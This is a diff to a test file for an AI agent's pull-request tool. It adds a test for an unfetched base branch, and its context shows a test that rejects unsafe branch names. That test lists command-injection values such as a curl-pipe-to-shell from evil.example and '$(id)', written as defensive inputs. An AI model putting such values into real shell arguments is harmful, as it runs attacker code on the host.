@@ -182,6 +182,14 @@ describe("open_pull_request — the approval gate", () => {
     expect(calls.some((c) => c.command.includes("push"))).toBe(false);
   });
 
+  test("a base the checkout hasn't fetched: the model is told to fetch with workspace_clone, nothing is asked", async () => {
+    const { sb, calls } = fakeRepo({ knownBases: ["main"] });
+    const tool = pullRequestTool({ sandboxFor: () => sb, github: staticToken("t"), fetch: fakeGithub().f });
+    const r = (await tool.run({ branch: "scout/x", title: "x", base: "scout/readme-license" }, { requestInput: async () => { throw new Error("asked"); } } as never)) as { error: string };
+    expect(r.error).toContain("origin/scout/readme-license isn't in this checkout yet. Fetch with workspace_clone (acme/widgets)");
+    expect(calls.some((c) => c.command.startsWith("git diff"))).toBe(false);
+  });
+
   test("a base that isn't a plain branch name never reaches a shell command", async () => {
     for (const base of ["main; curl evil.example | sh", "$(id)", "main`id`", "-x", "a..b", "main && true", "main\nid"]) {
       const { sb, calls } = fakeRepo();
